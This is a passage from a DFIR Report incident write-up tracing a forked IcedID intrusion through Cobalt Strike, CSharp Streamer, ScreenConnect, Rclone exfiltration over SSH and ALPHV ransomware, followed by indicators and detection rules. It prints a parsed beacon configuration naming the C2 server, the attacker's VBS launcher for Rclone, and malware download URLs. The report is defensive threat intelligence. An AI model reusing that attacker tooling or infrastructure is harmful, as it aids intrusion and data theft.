<p>The <a href="https://thedfirreport.com/services/threat-intelligence/">DFIR Threat intelligence feeds</a> tracked this infrastructure as a live Cobalt Strike server starting 2023-09-29 through 2023-10-30.</p>



<p>The following URIs were accessed for 85.209.11.48:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34768" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-054.png" alt="" width="259" height="296" /></a></p>





<p>Using MemProcFS to process the memory from the backup server, we were able to extract the minidump for the injected Cobalt Strike process. Using the minidump, the beacon configuration was able to be parsed using <a href="http://1768.py" target="_blank" rel="noreferrer noopener">1768.py</a>:</p>



<pre class="wp-block-preformatted">File: minidump.dmp
Config found: xorkey b'.' 0x00000000 0x00010000
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 80
0x0003 sleeptime                        0x0002 0x0004 60000
0x0004 maxgetsize                       0x0002 0x0004 1048576
0x0005 jitter                           0x0001 0x0002 0
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100a70991d69d816a601ffa80976473830f0d3b41276d2790401ddedb18e2d3cab3c315e3222325be42b65adb2878f33f5a03ff5010b23e842a510c1482ad6a42f1e7e5726eb31813e7437640ed7879955f401e172c34d3517241596dd41f8e48d3d1b1c288e6c8752ff65dc27acccba4ba9cd6d0e4de6196cea4da480d3b99d0ed020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Has known private key
0x0008 server,get-uri                   0x0003 0x0100 '85.209.11.48,/load'
0x0043 DNS_STRATEGY                     0x0001 0x0002 0
0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1
0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1
0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 1580103824 Stats uniques -&gt; ips/hostnames: 210 publickeys: 92
0x0026 bStageCleanup                    0x0001 0x0002 0
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0009 useragent                        0x0003 0x0100 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)'
0x000a post-uri                         0x0003 0x0040 '/submit.php'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4]
   Print
0x000c http_get_header                  0x0003 0x0200
  Build Metadata: [7:Metadata,3,6:Cookie]
   BASE64
   Header Cookie
0x000d http_post_header                 0x0003 0x0200
  Const_header Content-Type: application/octet-stream
  Build SessionId: [7:SessionId,5:id]
   Parameter id
  Build Output: [7:Output,4]
   Print
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 1
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 0
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 '"+\x8f\'Ûßº\x8dÝU\x9eì¢~¦H'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.3 (max 0x0046)
Sanity check Cobalt Strike config: OK
Sleep mask 64-bit 4.2 deobfuscation routine found: 0x005e2f3f
Sleep mask 64-bit 4.2 deobfuscation routine found: 0x00624b3f
</pre>



<p><strong>CSharp Streamer</strong></p>



<p>The &#8220;cslite.exe&#8221; CSharp Streamer executable communicated to the IP address 109.236.80.191. During the intrusion, we observed traffic to it across various ports, including 135, 139, 80, 443, and 3389. Most traffic was observed at 443 and 3389. Looking at the memory of the &#8220;cslite.exe&#8221; run in a sandbox, we can extract the configured communication preferences for the trojan:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34769" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-055.png" alt="" width="730" height="769" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-055.png 730w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-055-285x300.png 285w" sizes="(max-width: 730px) 100vw, 730px" /></a></p>





<p>The malware uses <a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/networking/websockets" target="_blank" rel="noreferrer noopener">WebSockets</a> for communication, as observed with the wss:// in the URL. We also see that the communication was setup to use <a href="https://socket.io/" target="_blank" rel="noreferrer noopener">socket.io</a>, to proxy the communication. And if the malware cannot reach a specific port, it rotates through a list of various ports, likely to both evade ports blocked in the victim firewall and help obfuscate communication by changing the port in use throughout an intrusion.</p>



<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>Ja3</td>
<td>Ja3s</td>
<td>AS Organization</td>
<td>ASN</td>
<td>Geolocation Country</td>
</tr>
<tr>
<td>109.236.80.191</td>
<td>443</td>
<td>www.i2rtqyj[.]ekz</td>
<td>c12f54a3f91dc7bafd92cb59fe009a35</td>
<td>394441ab65754e2207b1e1b457b3641d</td>
<td>WorldStream B.V.</td>
<td>49981</td>
<td>Netherlands</td>
</tr>
</tbody>
</table>
</figure>



<p>&nbsp;</p>
<pre>ja4: t12i210600_76e208dd3e22_2dae41c691ec<br />ja4s: t120200_c02f_ec53b3cc8a64<br />ja4s: t120400_c02f_12a20535f9be<br />ja4x: bbd6cc0fca29_4ce939b68fae_79faaa53868b</pre>
<p>During the intrusion, we observed several Zeek notice messages alerting on the self-signed certificate used by the CSharp Streamer command and control server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34770" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-056.png" alt="" width="1306" height="356" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-056.png 1306w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-056-300x82.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-056-1024x279.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-056-768x209.png 768w" sizes="(max-width: 1306px) 100vw, 1306px" /></a></p>





<p><strong>ScreenConnect</strong></p>



<p>Post the initial forked IcedID loader infection, the threat actor deployed ScreenConnect on the beachhead using a renamed binary &#8220;toovey.exe&#8221;. Later, ScreenConnect was installed on multiple systems by dropping renamed installer and executing it through Impacket&#8217;s wmiexec.py script.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34771" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-057.png" alt="" width="1653" height="238" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-057.png 1653w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-057-300x43.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-057-1024x147.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-057-768x111.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-057-1536x221.png 1536w" sizes="(max-width: 1653px) 100vw, 1653px" /></a></p>





<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>



<p>While Firefox was used to preview documents, it was also used to download Rclone. When the process command line is not available, defenders can look for web history artifacts. In Firefox, web history artifacts are <a href="https://www.foxtonforensics.com/browser-history-examiner/firefox-history-location" target="_blank" rel="noreferrer noopener">well</a> <a href="https://www.infosecinstitute.com/resources/digital-forensics/browser-forensics-firefox/" target="_blank" rel="noreferrer noopener">documented</a> and can be directly looked at using an SQLite browser.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34772" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-058.png" alt="" width="1294" height="131" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-058.png 1294w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-058-300x30.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-058-1024x104.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-058-768x78.png 768w" sizes="(max-width: 1294px) 100vw, 1294px" /></a></p>





<p>Rclone was dropped on the file server. This can be detected by looking at file creation, for instance using the event ID 11 from Sysmon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34773" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-059.png" alt="" width="761" height="57" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-059.png 761w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-059-300x22.png 300w" sizes="(max-width: 761px) 100vw, 761px" /></a></p>





<p>Rclone was not directly started, but was launched though a VBS script named nocmd.vbs, which itself executes rcl.bat, which in turn executes Rclone.</p>



<pre class="wp-block-preformatted">Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) &amp; "c:\programdata\rcl.bat" &amp; Chr(34), 0
Set WshShell = Nothing
</pre>



<p>Before that, the threat actor used the <a href="https://rclone.org/commands/rclone_config/" target="_blank" rel="noreferrer noopener">config</a><a href="https://rclone.org/commands/rclone_config/" target="_blank" rel="noreferrer noopener"> Rclone command</a>, which performs the following action according to the documentation:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>enter an interactive configuration session where you can setup new remotes and manage existing ones</p>
</blockquote>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34774" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-060.png" alt="" width="715" height="75" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-060.png 715w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-060-300x31.png 300w" sizes="(max-width: 715px) 100vw, 715px" /></a></p>



<p>Upon execution, network artifacts show an increase in egress traffic to the exfiltration server on port 22 (SSH). Increase of egress traffic, especially to previously unknown hosts or suspicious ports can be used to detect early exfiltration attempts. Indeed, below is presented a chart of traffic to port 22 during the whole course of this intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34775" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-061.png" alt="" width="1720" height="301" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-061.png 1720w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-061-300x53.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-061-1024x179.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-061-768x134.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-061-1536x269.png 1536w" sizes="(max-width: 1720px) 100vw, 1720px" /></a></p>





<p>Exfiltration Server data:</p>



<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>AS Organization</td>
<td>ASN</td>
<td>Geolocation Country</td>
</tr>
<tr>
<td>217.23.12.8</td>
<td>22</td>
<td>N/A</td>
<td>WorldStream B.V.</td>
<td>49981</td>
<td>Netherlands</td>
</tr>
</tbody>
</table>
</figure>



<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>



<p>On the eighth day of the intrusion, the threat actor moved toward their final objective, deploying ALPHV Ransomware. This started with the threat actor staging two files on the backup server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34776" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-062.png" alt="" width="930" height="220" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-062.png 930w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-062-300x71.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-062-768x182.png 768w" sizes="(max-width: 930px) 100vw, 930px" /></a></p>





<p>&#8220;setup.exe,&#8221; which was dropped twice, was just the latest ScreenConnect installer the adversary employed during the intrusion. &#8220;BNUfUOmFT2.exe&#8221; was the ransomware binary.</p>



<p>First, they used the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy" target="_blank" rel="noreferrer noopener">xcopy</a> Windows utility to move the ScreenConnect installer across the domain in the root of C$:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34777" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-063.png" alt="" width="1183" height="553" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-063.png 1183w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-063-300x140.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-063-1024x479.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-063-768x359.png 768w" sizes="(max-width: 1183px) 100vw, 1183px" /></a></p>





<p>Second, they remotely ran the installer on hosts using WMI commands:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34778" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-064.png" alt="" width="1435" height="504" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-064.png 1435w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-064-300x105.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-064-1024x360.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-064-768x270.png 768w" sizes="(max-width: 1435px) 100vw, 1435px" /></a></p>





<p>Third, they repeated the process, copying the ransomware payload from the backup server to the domain joined hosts in the network.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34779" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-065.png" alt="" width="1084" height="731" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-065.png 1084w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-065-300x202.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-065-1024x691.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-065-768x518.png 768w" sizes="(max-width: 1084px) 100vw, 1084px" /></a></p>





<p>Finally, they used this same method to execute the ransomware remotely via WMI:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34780" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-066.png" alt="" width="1883" height="461" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-066.png 1883w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-066-300x73.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-066-1024x251.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-066-768x188.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-066-1536x376.png 1536w" sizes="(max-width: 1883px) 100vw, 1883px" /></a></p>





<p>On the remote hosts, the &#8220;WMIPrvSE.exe&#8221; was observed executing the task.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34781" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-067.png" alt="" width="1543" height="812" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-067.png 1543w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-067-300x158.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-067-1024x539.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-067-768x404.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-067-1536x808.png 1536w" sizes="(max-width: 1543px) 100vw, 1543px" /></a></p>





<p>During the ransomware deployment phase, we observed the threat actor deleting all the backups interactively.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34782" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-068.png" alt="" width="1116" height="537" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-068.png 1116w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-068-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-068-1024x493.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-068-768x370.png 768w" sizes="(max-width: 1116px) 100vw, 1116px" /></a></p>





<p>After completing the encryption of files, the following note was left on the infected hosts with the call out to review Twitter to associate the group:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34783" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-069.png" alt="" width="922" height="443" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-069.png 922w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-069-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-069-768x369.png 768w" sizes="(max-width: 922px) 100vw, 922px" /></a></p>





<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34930" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3.png" alt="" width="4298" height="7144" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3.png 4298w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3-180x300.png 180w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3-616x1024.png 616w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3-768x1277.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3-924x1536.png 924w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-070-3-1232x2048.png 1232w" sizes="(max-width: 4298px) 100vw, 4298px" /></a></p>





<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-071.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34785" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-071.png" alt="" width="3358" height="2050" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-071.png 3358w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-071-300x183.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-071-1024x625.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-071-768x469.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-071-1536x938.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-071-2048x1250.png 2048w" sizes="(max-width: 3358px) 100vw, 3358px" /></a></p>





<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>



<h3 class="wp-block-heading">Atomic</h3>



<pre class="wp-block-preformatted">CobaltStrike
85.209.11[.]48 

CSharp Streamer
109.236.80[.]191 

Data exfiltration
217.23.12[.]8 

Forked IcedID Loader
212.18.104[.]12 / modalefastnow[.]com

2nd Stage IcedID payload
92.118.112[.]113 / hofsaalos[.]com
173.255.204[.]62 / jkbarmossen[.]com
94.232.46[.]27 / evinakortu[.]com
77.105.140[.]181 / jerryposter[.]com
77.105.142[.]135 / skrechelres[.]com

URLs
http[:]//85.209.11[.]48:80/download/test1.exe 
http[:]//85.209.11[.]48:80/download/http64.exe
http[:]//85.209.11[.]48:80/download/csss.exe 
http[:]//85.209.11[.]48:80/ksajSk
http[:]//85.209.11[.]48:80/ksaid
http[:]//temp[.]sh/VSlAV/http64.exe
</pre>



<h3 class="wp-block-heading">Computed</h3>



<pre class="wp-block-preformatted"> cscs.exe
	 99d8c3e7806d71a2b6b28be525c8e10e
	 59791ec1c857d714f9b4ad6c15a78191206a7343
	 5d1817065266822df9fa6e8c5589534e031bb6a02493007f88d51a9cfb92e89b 

cscss.exe
	 08fcf90499526a0a41797f8fdd67d107
	 7d130ace197f4148932306facfc8d71fa8738d86
	 c2ddb954877dcfbb62fd615a102ce5fa69f4525abc1884e8fe65b0c2b120cfd4
		  
cscssss.exe
	 26239fa16d0350b2224bfb07e37cbd84
	 8837ad1bafb56019a46822da0ed8b468f380c80d
	 7d2e705dcaa9f36fb132b7ff329f61dd5d0393c28dcd53b2be1e3ba85c633360
 
 ccs.exe
	2b1b2b271bc78e67beca2dcd04354189
	c83da151f26a58aecb24fc6ba4945acb934ee954
    bd4876f7efbd18a03bbb401a5dc77ed68ef95c72a3f7be83cef39a4515e0c476

rclone.exe
	581cfc2d4e02a16b9b2f8dcb70a46b8b
	1d345799307c9436698245e7383914b3a187f1ec
	9c5b233efb2e2a92a65b5ee31787281dd043a342c80c7ac567ccf43be2f2843f

BNUfUOmFT2.exe
	7ff0241b28d766198743d661a2f67620
	27acb306baec022a974db50a90f48183541e12fe
	94d6395dcab01250650e884f591956464d582a4f1f5da948055e6d2f0a215ace

confucius_cpp.exe
	fb34b1fb80b053e69d89af5330cd7d4b
	e97b00ef58fe081170137536f28df590dbb41a0e
	dfa8c282178a509346fb0154e6dbd5fbb0b56c38894ce7d244f5ca26d6820e67

cslite.exe
	642bf60f06bb043c4a74d0501597cf5e
	e1bc0c7cf030af31522c1160e0c70df5cecbb64a
	4103cc8017409963b417c87259af2a955653567cdbf7d5504198dd350f9ef9c1

https64.dll
	5548caa3b8cdd73b3a56f3f102942882
	e43ecd2f6859e4769028fbd7176bb3339393ea22
	d8f51dcfe928a1674e8d88029a404005ab826527372422cac24c81467440feb0

http64.dll
	0decfd5e200803523c0437ff7aac7349
	be8fd3c3507f02785da6f12c9b21ff73638cdf23
	cd0e941587672ab1517681a7e3b4f93a00020f8c8c8479a76b9e3555bcd04121

ccslt.exe
	5cbb08cd26162e8046df17d15ba6e907
	41f47f8ee34c9ae7a4bb43b71e3cc85266302e8e
	6a6cd64fba34aadad2df808b0fcab89ef26a897040268b24fed694036cc51d6a 

iwiqocacod.dll
	efb019b1999d478a4161a030a5d9302e
	514ddcf981d7d8684b3ac20e902f5017292d51c5
	bc49622009b29c23ee762fe6f000936eb1c4c1b29496d5382f175c99ad941aac

JNOV0135_7747811.zip
	24701208c439b00a43908ae39bbf7de8
	25ef7044cdf9b7c17253625a2bd5d2d6fee44227
	3336bfde9b6b8ef05f1d704d247a1a8fd0641afaecc6a71f5cfa861234c4317b

[2023.10.11_08-07].vbs
	4ff5625e6bd063811ec393b315d2c714
	42b188e2e015a72accc50fcbde2d2c81f5258d0b
	5bab2bc0843f9d5124b39f80e12ad6d1f02416b0340d7cfec8cf7b14cd4385bf

0370-1.dll
	bf15a998fd84bee284ae9f7422bda640
	e51217efb6e33fca9f7c5f51e5c3a4ae50499a37
	fab34d1f0f906f64f95b9f244ae1fe090427e606a9c808c720e18e93a08ed84d

netscan.exe
	a768244ca664349a6d1af84a712083c0
	39300863bcaad71e5d4efc9a1cae118440aa778f
	e14ba0fb92e16bb7db3b1efac4b13aee178542c6994543e7535d8efaa589870c

nocmd.vbs
	d28271ed838464d1debab434ef6d8e37
	2741c136b92aca1e890d2b67084c6867d3cbaa87
	457a2f29d395c04a6ad6012fab4d30e04d99d7fc8640a9ee92e314185cc741d3

rcl.bat
	00c3f790f6e329530a6473882007c3e5
	b02db8c2b9614e986e58f6e31be686b418f9aba7
	6f3a02674b6bbf05af8a90077da6e496cc47dda9101493b8103f0f2b4e4fd958
</pre>



<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>



<h3 class="wp-block-heading">Network</h3>



<pre class="wp-block-preformatted">ET INFO Executable Download from dotted-quad Host
ETPRO HUNTING Windows BITS UA Retrieving EXE
ET HUNTING Suspicious BITS EXE DL From Dotted Quad
ET POLICY PE EXE or DLL Windows file download HTTP
ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response
ETPRO HUNTING Windows BITS UA Retrieving EXE M2
ETPRO POLICY Observed MS Certutil User-Agent in HTTP Request
ETPRO MALWARE Likely Evil Certutil Retrieving EXE
ThreatFox payload delivery (domain - confidence level: 100%)
ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile
ThreatFox Cobalt Strike botnet C2 traffic (ip:port - confidence level: 80%)
ET INFO Packed Executable Download
ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1
ET MALWARE Cobalt Strike Beacon Observed
ET MALWARE Win32/IcedID Requesting Encoded Binary M4
ET MALWARE Win32/IcedID Request Cookie
ET SCAN Potential SSH Scan OUTBOUND 
</pre>



<h3 class="wp-block-heading">Sigma</h3>



<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>



<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules">DFIR Report Public Repo</a>:</p>



<pre class="wp-block-preformatted">8a0d153f-b4e4-4ea7-9335-892dfbe17221: NetScan Share Enumeration Write Access Check
dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f: CHCP CodePage Locale Lookup
</pre>



<p>DFIR Report Private Repo:</p>



<pre class="wp-block-preformatted">7019b8b4-d23e-4d35-b5fa-192ffb8cb3ee: Use of Rclone to exfiltrate data over an SSH channel
a09079c2-e4af-4963-84d2-d65c2fb332f5: Detection of CertUtil Misuse for Malicious File Download
6f77de5c-27af-435b-b530-e2d07b77a980: Impacket Tool Execution<br />6fc673ac-ec2f-4de8-8a14-a395f1b2b531: Potential CSharp Streamer RAT loading binary from APPDATA<br />879ddba7-5cb9-484f-88a4-c1d87034166f: Suspicious ScreenConnect Script Execution
</pre>



<p><a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">Sigma Repo</a>:</p>



<pre class="wp-block-preformatted">90f138c1-f578-4ac3-8c49-eecfd847c8b7: BITS Transfer Job Download From Direct IP
10c14723-61c7-4c75-92ca-9af245723ad2: HackTool - Potential Impacket Lateral Movement Activity
b1f73849-6329-4069-bc8f-78a604bb8b23: Remote Access Tool - ScreenConnect Remote Command Execution
90b63c33-2b97-4631-a011-ceb0f47b77c3: Suspicious Execution From GUID Like Folder Names
19b08b1c-861d-4e75-a1ef-ea0c1baf202b: Suspicious Download Via Certutil.EXE
d059842b-6b9d-4ed1-b5c3-5b89143c6ede: File Download Via Bitsadmin
e37db05d-d1f9-49c8-b464-cee1a4b11638: PUA - Rclone Execution
7090adee-82e2-4269-bd59-80691e7c6338: Console CodePage Lookup Via CHCP
d5601f8c-b26f-4ab0-9035-69e11a8d4ad2: CobaltStrike Named Pipe
c8557060-9221-4448-8794-96320e6f3e74: Windows PowerShell User Agent
1edff897-9146-48d2-9066-52e8d8f80a2f: Suspicious Invoke-WebRequest Execution With DirectIP
0ef56343-059e-4cb6-adc1-4c3c967c5e46: Suspicious Execution of Systeminfo
903076ff-f442-475a-b667-4f246bcc203b: Nltest.EXE Execution
5cc90652-4cbd-4241-aa3b-4b462fa5a248: Potential Recon Activity Via Nltest.EXE
624f1f33-ee38-4bbe-9f4a-088014e0c26b: IcedID Malware Execution Patterns
</pre>



<h3 class="wp-block-heading">Yara</h3>



<pre class="wp-block-preformatted">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/24952/24952.yar
</pre>



<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34934" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1.png" alt="" width="1796" height="2380" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1.png 1796w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1-226x300.png 226w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1-773x1024.png 773w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1-768x1018.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1-1159x1536.png 1159w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-072-3-1-1545x2048.png 1545w" sizes="(max-width: 1796px) 100vw, 1796px" /></a></p>





